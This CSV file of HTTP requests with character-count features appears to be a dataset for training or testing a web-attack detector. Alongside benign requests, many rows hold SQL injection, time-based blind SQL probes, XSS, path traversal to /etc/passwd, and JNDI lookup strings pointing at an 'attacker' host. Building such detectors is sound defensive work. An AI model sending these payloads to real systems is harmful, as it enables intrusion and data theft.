method,path,body,single_q,double_q,dashes,braces,spaces,badwords
POST,/weather/week,uname=test&pass=test,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
POST,/partners/login,product=123&type=info,0,0,0,0,0,0
GET,/billing/invoice?id=55?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/category/fashion,comment=Nice+product,0,0,0,0,1,0
POST,/news/latest,uemail=test@example.com,0,0,0,0,0,0
POST,/blog?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/forum/threads,id=55,0,0,0,0,0,0
POST,/billing/invoice?id=55,comment=Nice+product,0,0,0,0,1,0
POST,/docs/api,uname=test&pass=test,0,0,0,0,0,0
POST,/category/sports,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/user/wishlist,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/docs/setup,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/movies/details?id=9,uname=test&pass=test,0,0,0,0,0,0
GET,/user/orders,,0,0,0,0,0,0
GET,/appointments,,0,0,0,0,0,0
POST,/privacy-policy,comment=Nice+product,0,0,0,0,1,0
POST,/api/v1/users?page=2,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/orders/detail?id=100,comment=Nice+product,0,0,0,0,1,0
POST,/downloads?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/shop/item?id=89,,0,0,0,0,0,0
POST,/assets/js/config.js?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
POST,/inbox/messages,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/auth/logout,,0,0,0,0,0,0
POST,/store/cart,id=55,0,0,0,0,0,0
GET,/user/orders,,0,0,0,0,0,0
POST,/books/bestsellers,uname=test&pass=test,0,0,0,0,0,0
POST,/admin,id=55,0,0,0,0,0,0
POST,/products.html,,0,0,0,0,0,0
POST,/university?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/playlists?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/blog/post2?q=admin%27+--,,1,0,1,0,1,0
POST,/user/profile?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/gallery,,0,0,0,0,0,0
POST,/products/related?id=10,product=123&type=info,0,0,0,0,0,0
POST,/promo,comment=Nice+product,0,0,0,0,1,0
POST,/admin/users?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/user/orders?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/settings/profile?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/blog/category/lifestyle,comment=Nice+product,0,0,0,0,1,0
POST,/user/notifications,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/search?page=3,uname=test&pass=test,0,0,0,0,0,0
POST,/docs/setup,uname=test&pass=test,0,0,0,0,0,0
GET,/auth/login,,0,0,0,0,0,0
POST,/careers,,0,0,0,0,0,0
GET,/user/wishlist,,0,0,0,0,0,0
GET,/account/info,,0,0,0,0,0,0
GET,/unsubscribe,,0,0,0,0,0,0
POST,/help/faq,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/restaurants,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/products/filter?cat=women?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/products/reviews?id=10,,0,0,0,0,0,0
GET,/checkout?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/assets/js/config.js?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/events,,0,0,0,0,0,0
GET,/unsubscribe,,0,0,0,0,0,0
GET,/careers,,0,0,0,0,0,0
GET,/support?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/feedback/form?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/news/trending,,0,0,0,0,0,0
GET,/inbox/read?id=7?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/index.php,,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
POST,/inbox?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/locations/europe,,0,0,0,0,0,0
GET,/books/read?id=100,,0,0,0,0,0,0
POST,/inbox/messages,comment=Nice+product,0,0,0,0,1,0
GET,/services.html,,0,0,0,0,0,0
POST,/admin,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/checkout,,0,0,0,0,0,0
GET,/offers,,0,0,0,0,0,0
POST,/movies?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
POST,/checkout/payment,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/music,product=123&type=info,0,0,0,0,0,0
GET,/account/history?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/category/home-appliances,,0,0,0,0,0,0
GET,/assets/images/banner.jpg,,0,0,0,0,0,0
POST,/billing,uname=test&pass=test,0,0,0,0,0,0
POST,/page/1,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/university/courses?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/products/filter?cat=men,,0,0,0,0,0,0
GET,/promo/winter,,0,0,0,0,0,0
GET,/blog/category/tech,,0,0,0,0,0,0
POST,/account?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/languages/english,,0,0,0,0,0,0
POST,/projects/list?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/api/v1/users/1,product=123&type=info,0,0,0,0,0,0
GET,/api/v3/settings,,0,0,0,0,0,0
POST,/admin,id=55,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
GET,/settings/security,,0,0,0,0,0,0
POST,/projects/list?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/help/contact,,0,0,0,0,0,0
POST,/docs/api,product=123&type=info,0,0,0,0,0,0
GET,/store/laptops,,0,0,0,0,0,0
POST,/subscriptions/manage?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,5
POST,/admin/settings,id=55,0,0,0,0,0,0
POST,/movies/details?id=9,id=55,0,0,0,0,0,0
GET,/partners?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/forum/category/tech,,0,0,0,0,0,0
GET,/events,,0,0,0,0,0,0
GET,/newsfeed,,0,0,0,0,0,0
POST,/products/new,uname=test&pass=test,0,0,0,0,0,0
GET,/auth/reset-password,,0,0,0,0,0,0
POST,/blog/post2?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/billing/invoice?id=55,,0,0,0,0,0,0
GET,/admin/logs,,0,0,0,0,0,0
POST,/organization/about?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/careers/jobs,,0,0,0,0,0,0
POST,/settings/billing,,0,0,0,0,0,0
GET,/store/laptops?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/organization/about,,0,0,0,0,0,0
POST,/music,comment=Nice+product,0,0,0,0,1,0
GET,/billing/history,,0,0,0,0,0,0
GET,/static/script.js?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,2
GET,/products/filter?price=high?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
GET,/events,,0,0,0,0,0,0
GET,/downloads/app?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/tickets,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v1/categories?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/search?page=3,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/category/home-appliances,uname=test&pass=test,0,0,0,0,0,0
POST,/api/v3/notifications,uemail=test@example.com,0,0,0,0,0,0
GET,/settings/security?q=admin%27+--,,1,0,1,0,1,0
POST,/promo/winter?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/restaurants/nearby,uname=test&pass=test,0,0,0,0,0,0
GET,/admin/users,,0,0,0,0,0,0
POST,/api/v1/users/2?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/admin/reports,uemail=test@example.com,0,0,0,0,0,0
POST,/user/notifications,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/pricing.html,,0,0,0,0,0,0
POST,/locations/india,id=55,0,0,0,0,0,0
GET,/admin/logs,,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/forum/category/general,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/movies,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/events/past,,0,0,0,0,0,0
POST,/products,id=55,0,0,0,0,0,0
GET,/user/profile?id=1?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/page/1,,0,0,0,0,0,0
GET,/shop/item?id=89,,0,0,0,0,0,0
GET,/tickets/open,,0,0,0,0,0,0
POST,/subscribe,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/api/v1/users,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/blog/category/tech?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
GET,/api/v3/messages,,0,0,0,0,0,0
GET,/api/v1/users?page=2,,0,0,0,0,0,0
POST,/analytics,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/offers,,0,0,0,0,0,0
POST,/pricing.html?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/news/world?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
GET,/api/v2/auth,,0,0,0,0,0,0
POST,/category/electronics?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/university/course?id=20,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/contact.html?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/careers/job?id=25,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
GET,/docs/tutorials?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/restaurants,,0,0,0,0,0,0
POST,/contact.php,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/weather/today,,0,0,0,0,0,0
GET,/blog/category/tech?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/playlists/mixes,,0,0,0,0,0,0
POST,/index.html,,0,0,0,0,0,0
POST,/auth/register?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/dashboard,,0,0,0,0,0,0
GET,/university/course?id=20,,0,0,0,0,0,0
POST,/forum/category/coding?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/blog,,0,0,0,0,0,0
POST,/downloads/app,product=123&type=info,0,0,0,0,0,0
GET,/tickets,,0,0,0,0,0,0
GET,/university?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/locations/europe,,0,0,0,0,0,0
POST,/api/v3/messages,,0,0,0,0,0,0
GET,/index.html,,0,0,0,0,0,0
POST,/static/theme.css?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/services.html,id=55,0,0,0,0,0,0
POST,/news/local,id=55,0,0,0,0,0,0
GET,/auth/reset-password,,0,0,0,0,0,0
POST,/inbox/messages,product=123&type=info,0,0,0,0,0,0
GET,/reviews,,0,0,0,0,0,0
GET,/api/v1/orders,,0,0,0,0,0,0
GET,/weather/city?name=Delhi?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/account/history,,0,0,0,0,0,0
GET,/books/bestsellers,,0,0,0,0,0,0
POST,/api/v2/login,product=123&type=info,0,0,0,0,0,0
POST,/settings/billing,product=123&type=info,0,0,0,0,0,0
POST,/auth/reset-password,uname=test&pass=test,0,0,0,0,0,0
POST,/gallery,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/search?cat=fashion,,0,0,0,0,0,0
GET,/store?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/settings/billing?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/unsubscribe?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/offers/clearance?q=sleep%285%29,,0,0,0,1,0,2
POST,/projects/list,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/billing/payment-methods?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/forum/post?id=1,uemail=test@example.com,0,0,0,0,0,0
GET,/docs/setup?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/category/fashion?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/static/style.css,,0,0,0,0,0,0
GET,/static/script.js?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,3
GET,/contact.php?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/gallery?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/admin,,0,0,0,0,0,0
GET,/search?cat=fashion?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/api/v2/login?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/projects/view?id=8,,0,0,0,0,0,0
POST,/tickets/open,uemail=test@example.com,0,0,0,0,0,0
POST,/library/book?id=10,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/forum/threads,,0,0,0,0,0,0
GET,/static/theme.css,,0,0,0,0,0,0
POST,/assets/images/logo.png,id=55,0,0,0,0,0,0
POST,/api/v1/users,id=55,0,0,0,0,0,0
GET,/downloads/pdf?id=1,,0,0,0,0,0,0
POST,/static/style.css,id=55,0,0,0,0,0,0
GET,/search?q=laptops?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/user/wishlist?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/products/filter?price=low,,0,0,0,0,0,0
GET,/tickets,,0,0,0,0,0,0
POST,/services.html,uname=test&pass=test,0,0,0,0,0,0
GET,/tickets/view?id=44,,0,0,0,0,0,0
GET,/api/v1/products,,0,0,0,0,0,0
GET,/api/v3/notifications,,0,0,0,0,0,0
POST,/page/3,uemail=test@example.com,0,0,0,0,0,0
GET,/gallery/photos,,0,0,0,0,0,0
POST,/about.html,comment=Nice+product,0,0,0,0,1,0
POST,/billing/payment-methods,id=55,0,0,0,0,0,0
POST,/products/new,product=123&type=info,0,0,0,0,0,0
GET,/index.html,,0,0,0,0,0,0
GET,/terms-and-conditions,,0,0,0,0,0,0
GET,/help/contact,,0,0,0,0,0,0
GET,/languages/english?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/help/contact,product=123&type=info,0,0,0,0,0,0
GET,/api/v1/users?page=2,,0,0,0,0,0,0
GET,/downloads/manual,,0,0,0,0,0,0
POST,/docs/api,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/search?page=3?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/api/v2/orders,,0,0,0,0,0,0
POST,/admin/reports,uemail=test@example.com,0,0,0,0,0,0
GET,/events?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/orders/list,,0,0,0,0,0,0
POST,/search?q=mobiles,comment=Nice+product,0,0,0,0,1,0
POST,/account/history,,0,0,0,0,0,0
POST,/category/fashion,,0,0,0,0,0,0
GET,/search?page=1,,0,0,0,0,0,0
GET,/library?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
POST,/projects/view?id=8?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/university/courses,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/restaurants,,0,0,0,0,0,0
GET,/forum/category/coding,,0,0,0,0,0,0
POST,/account/history,product=123&type=info,0,0,0,0,0,0
POST,/partners,product=123&type=info,0,0,0,0,0,0
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
POST,/settings?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/page/4,,0,0,0,0,0,0
GET,/partners/apply?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/auth/logout,,0,0,0,0,0,0
GET,/careers/job?id=25?q=%27%3B+DROP+TABLE+users%3B+--,,1,0,1,0,4,2
POST,/docs/examples,comment=Nice+product,0,0,0,0,1,0
POST,/user/notifications?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/search?page=3,,0,0,0,0,0,0
GET,/events/upcoming?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/events?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/products/filter?price=high?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/products/view?id=2,,0,0,0,0,0,0
POST,/blog,product=123&type=info,0,0,0,0,0,0
POST,/promo?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
POST,/subscriptions/manage,uemail=test@example.com,0,0,0,0,0,1
POST,/checkout/payment,uname=test&pass=test,0,0,0,0,0,0
GET,/help/faq?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
GET,/news/local?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
POST,/page/4?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/contact.html?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/store/phones,id=55,0,0,0,0,0,0
GET,/blog/category/security?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/dashboard,,0,0,0,0,0,0
GET,/api/v1/products,,0,0,0,0,0,0
POST,/user/wishlist/add?id=98,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/subscriptions/manage,comment=Nice+product,0,0,0,0,1,1
POST,/page/2,uname=test&pass=test,0,0,0,0,0,0
GET,/partners/apply,,0,0,0,0,0,0
GET,/api/v3/dashboard,,0,0,0,0,0,0
POST,/products/new?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/feedback/submit,,0,0,0,0,0,0
GET,/careers,,0,0,0,0,0,0
POST,/pricing.html,comment=Nice+product,0,0,0,0,1,0
POST,/products/view?id=2,uemail=test@example.com,0,0,0,0,0,0
GET,/support/ticket?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/checkout,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/products/filter?cat=women,,0,0,0,0,0,0
GET,/sports/football,,0,0,0,0,0,0
GET,/assets/js/config.js?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/api/v1/users/1?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/events?q=%253Cscript%253Ealert%28%29,,0,0,0,1,0,2
GET,/category/electronics?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/playlists/mixes?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/user/cart/add?id=45,id=55,0,0,0,0,0,0
GET,/crypto/coin?id=ETH,,0,0,0,0,0,0
POST,/shop?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/docs/introduction,,0,0,0,0,0,0
POST,/store,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/user/orders,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/travel/offers?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/languages,,0,0,0,0,0,0
GET,/travel/hotels,,0,0,0,0,0,0
POST,/books,uemail=test@example.com,0,0,0,0,0,0
GET,/books?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/feedback/submit,,0,0,0,0,0,0
GET,/api/v3/notifications?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/university/courses,,0,0,0,0,0,0
POST,/store/phones,id=55,0,0,0,0,0,0
POST,/weather/city?name=Delhi,uname=test&pass=test,0,0,0,0,0,0
GET,/user/messages?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/checkout,,0,0,0,0,0,0
GET,/assets/images/banner.jpg?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/products/list,uname=test&pass=test,0,0,0,0,0,0
POST,/orders,uemail=test@example.com,0,0,0,0,0,0
GET,/news/local,,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
POST,/promo,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/stocks,product=123&type=info,0,0,0,0,0,0
POST,/docs?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/account/security,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/static/style.css?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/library/books,,0,0,0,0,0,0
GET,/feedback/form,,0,0,0,0,0,0
GET,/shop/categories,,0,0,0,0,0,0
GET,/music/songs,,0,0,0,0,0,0
GET,/docs,,0,0,0,0,0,0
GET,/library/books,,0,0,0,0,0,0
POST,/billing/payment-methods?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/products/trending,,0,0,0,0,0,0
GET,/store/checkout,,0,0,0,0,0,0
GET,/page/2?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,,0,0,0,0,0,0
POST,/news/trending,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/checkout/payment?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/movies/popular,product=123&type=info,0,0,0,0,0,0
POST,/assets/js/config.js,comment=Nice+product,0,0,0,0,1,0
GET,/shop/categories,,0,0,0,0,0,0
GET,/analytics/sales,,0,0,0,0,0,0
POST,/blog/post3,uname=test&pass=test,0,0,0,0,0,0
POST,/downloads/pdf?id=1,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/organization/about,uname=test&pass=test,0,0,0,0,0,0
GET,/settings/security,,0,0,0,0,0,0
POST,/sports,uemail=test@example.com,0,0,0,0,0,0
POST,/blog/archive/2023,uname=test&pass=test,0,0,0,0,0,0
POST,/orders/list,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/products/filter?cat=men?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/downloads/app?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/projects/list,id=55,0,0,0,0,0,0
GET,/feedback/submit,,0,0,0,0,0,0
GET,/partners?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/store/phones,,0,0,0,0,0,0
POST,/promo/summer,uname=test&pass=test,0,0,0,0,0,0
POST,/search?cat=electronics,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v1/orders,,0,0,0,0,0,0
POST,/movies/popular?q=admin%27+--,data=admin%27+--,2,0,2,0,2,0
GET,/tickets,,0,0,0,0,0,0
GET,/products/view?id=2,,0,0,0,0,0,0
GET,/store/cart,,0,0,0,0,0,0
GET,/gallery/videos?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/account/info?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/api/v1/users/1,,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
GET,/careers/job?id=25,,0,0,0,0,0,0
GET,/user/profile?id=1,,0,0,0,0,0,0
GET,/partners/login,,0,0,0,0,0,0
GET,/billing/payment-methods,,0,0,0,0,0,0
GET,/api/v1/items?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/blog/post3,,0,0,0,0,0,0
GET,/analytics/sales,,0,0,0,0,0,0
GET,/stocks,,0,0,0,0,0,0
POST,/admin/logs,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v2/auth?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
POST,/api/v2/login,id=55,0,0,0,0,0,0
POST,/checkout/address?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/news/business,,0,0,0,0,0,0
GET,/stocks/market,,0,0,0,0,0,0
POST,/api/v1/products?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/api/v3/notifications,,0,0,0,0,0,0
GET,/news,,0,0,0,0,0,0
POST,/notifications/settings?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/contact.php,,0,0,0,0,0,0
POST,/subscriptions,product=123&type=info,0,0,0,0,0,1
GET,/forum/category/general,,0,0,0,0,0,0
POST,/support/chat?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/promo,,0,0,0,0,0,0
POST,/organization/about?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
POST,/movies/details?id=9,uname=test&pass=test,0,0,0,0,0,0
GET,/feedback,,0,0,0,0,0,0
GET,/library/books,,0,0,0,0,0,0
POST,/downloads/manual?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/news/trending,id=55,0,0,0,0,0,0
POST,/newsfeed/today,uemail=test@example.com,0,0,0,0,0,0
POST,/offers/clearance?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/restaurants/view?id=23?q=admin%27+--,,1,0,1,0,1,0
POST,/playlists/mixes,uemail=test@example.com,0,0,0,0,0,0
